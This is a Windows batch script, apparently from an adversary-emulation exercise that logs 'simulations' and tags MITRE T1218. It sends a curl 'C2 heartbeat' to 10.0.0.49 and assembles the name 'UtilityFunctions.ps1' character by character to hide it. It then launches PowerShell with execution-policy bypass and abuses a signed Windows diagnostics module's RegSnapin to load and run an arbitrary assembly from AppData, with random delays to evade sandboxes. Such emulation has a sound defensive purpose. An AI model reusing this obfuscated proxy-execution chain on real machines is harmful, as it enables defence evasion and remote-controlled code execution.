@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET zzxbn=%APPDATA%\8602\e0f61247
SET pmdkl=https://10.0.0.49
SET wfghr=https://10.0.0.49/stage/2/icon.png?8602-7
SET rvytg=ITZEL-S2BO
SET klnjg=7
SET bvnty=winword.txt
SET qwhjk=8602
SET lgfl=%APPDATA%\!klnjg!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!rvytg!]: script_start>> "!lgfl!" 2>nul

timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!rvytg!]: initial_delay_complete>> "!lgfl!" 2>nul

curl -k -s -o nul "!wfghr!"
echo [!DATE! !TIME!][DEBUG][!rvytg!]: c2_heartbeat_sent>> "!lgfl!" 2>nul

ping -n 10 127.0.0.1 >nul
SET lhpx=U
SET akjk=t
SET bqwt=i
SET cfxd=l
SET dgxy=i
SET ezyu=t
SET fzab=y
SET gbcc=F
SET hcdd=u
SET idxe=n
SET jeyf=c
SET kfzg=t
SET lgah=i
SET mhbi=o
SET nibj=n
SET ojck=s
SET pkdl=.
SET qlem=p
SET rmfn=s
SET sngo=1
SET ofspp1=%lhpx%%akjk%%bqwt%%cfxd%%dgxy%%ezyu%%fzab%%gbcc%%hcdd%%idxe%%jeyf%%kfzg%%lgah%%mhbi%%nibj%%ojck%%pkdl%%qlem%%rmfn%%sngo%

SET /A qdhym=%RANDOM% %% 20 + 10
timeout /t !qdhym! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!rvytg!]: random_delay_complete>> "!lgfl!" 2>nul

SET xzcc=Reg
SET yxdd=Snapin
SET zzaa=!zzxbn!\!bvnty!
SET aacc=[
SET bbdd=Pro
SET ccee=gram
SET ddee=.
SET effg=Cla
SET gfhi=ss
SET hgij=]:
SET ikjl=Da
SET jlmk=le
SET kmln=()
SET pwcmd=set-location -path c:\windows\diagnostics\system\networking; import-module .\!ofspp1!; %xzcc%%yxdd% %zzaa%;%aacc%%bbdd%%ccee%%ddee%%effg%%gfhi%%hgij%%ikjl%%jlmk%%kmln%

CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!rvytg!]: pre_execution_delay_complete>> "!lgfl!" 2>nul

powershell.exe -ep bypass -command "!pwcmd!"
SET jdkn=0
IF NOT !errorlevel!==0 SET jdkn=1
SET nbmv=!jdkn!
SET zxcv=
IF NOT !nbmv!==0 SET zxcv=assembly_load_failed
echo [!DATE! !TIME!][DEBUG][!rvytg!]: assembly_execution_result=!nbmv!>> "!lgfl!" 2>nul

SET ts=%DATE:~10,4%-%DATE:~4,2%-%DATE:~7,2% %TIME:~0,2%:%TIME:~3,2%:%TIME:~6,2%.%TIME:~9,2%
echo [!ts!][!rvytg!]: !klnjg!-!qwhjk!-T1218|Signed Binary Proxy Execution=!nbmv!:!zxcv!>> "!lgfl!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!rvytg!]: post_execution_delay_complete>> "!lgfl!" 2>nul